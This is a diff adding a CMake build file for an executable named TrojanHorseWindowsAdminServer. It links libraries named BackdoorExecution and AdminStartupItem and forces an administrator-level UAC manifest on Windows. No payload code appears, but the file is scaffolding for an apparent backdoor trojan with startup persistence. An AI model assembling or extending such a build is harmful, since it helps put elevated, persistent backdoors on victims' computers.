@@ -1,0 +1,17 @@
+add_executable(TrojanHorseWindowsAdminServer main.cpp)
+target_link_libraries(TrojanHorseWindowsAdminServer PUBLIC SharedConstants BackdoorExecution AdminCheck PathToCurrentExecutable AdminStartupItem CombaseLibrary)
+
+if (CMAKE_SYSTEM_NAME STREQUAL "Windows")
+    # Run executable as administrator
+    set_target_properties(TrojanHorseWindowsAdminServer PROPERTIES LINK_FLAGS "/MANIFESTUAC:\"level='requireAdministrator' uiAccess='false'\"")
+    if (CMAKE_CXX_COMPILER_ID MATCHES GNU)
+        # target_link_options(TrojanHorseWindowsAdminServer PRIVATE -Wl,--subsystem,windows)
+        # target_link_options(TrojanHorseWindowsAdminServer PRIVATE -Wl,--subsystem,console)
+    elseif (CMAKE_CXX_COMPILER_ID MATCHES MSVC)
+        # set_target_properties(TrojanHorseWindowsAdminServer PROPERTIES LINK_FLAGS /SUBSYSTEM:WINDOWS)
+        # set_target_properties(TrojanHorseWindowsAdminServer PROPERTIES LINK_FLAGS /SUBSYSTEM:CONSOLE)
+    endif()
+elseif (CMAKE_SYSTEM_NAME STREQUAL "Linux")
+else()
+    message(FATAL_ERROR "Not Windows or Linux")
+endif()
